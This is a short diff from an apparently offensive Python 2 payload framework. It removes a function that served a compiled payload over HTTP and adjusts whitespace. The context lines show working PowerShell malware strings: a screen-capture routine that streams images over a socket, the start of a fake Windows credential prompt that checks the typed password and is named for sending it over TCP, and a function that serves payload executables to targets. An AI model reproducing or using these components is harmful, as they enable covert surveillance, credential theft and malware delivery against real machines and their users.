@@ -181,7 +181,7 @@ class SHELLCODE(object):
         "$b.Dispose();$length = $MemoryStream.Length;[byte[]] $Bytes = $MemoryStream.ToArray();"
         "$str = \"`n`n--boundary`n\" + \"Content-Type: image/jpeg`n\" + \"Content-Length: $length`n`n\";"
         "SendStrResponse $socket $str;SendResponse $socket $Bytes}$MemoryStream.Close()}catch{Write-Warning \"Something went wrong!\"; Write-Error $_}}")
-    
+
     windows_ps_ask_creds_tcp = (
         "$ErrorActionPreference=\"SilentlyContinue\";Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
         "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
@@ -355,13 +355,6 @@ class FUNCTIONS(object):
             httpd.serve_forever()
         except:
             print t.bold_red + '\n[*] WebServer Shutdown' + t.normal
-
-    def DoServeShellter(self, IP, payloadname):
-        print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadname) + t.normal
-        a = multiprocessing.Process(
-            target=self.ServePayload, args=(os.getcwd() + '/compiled',))
-        a.daemon = True
-        a.start()
 
     def DoServe(self, IP, payloadname, payloaddir):
         print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s.exe" % (IP, payloadname) + t.normal
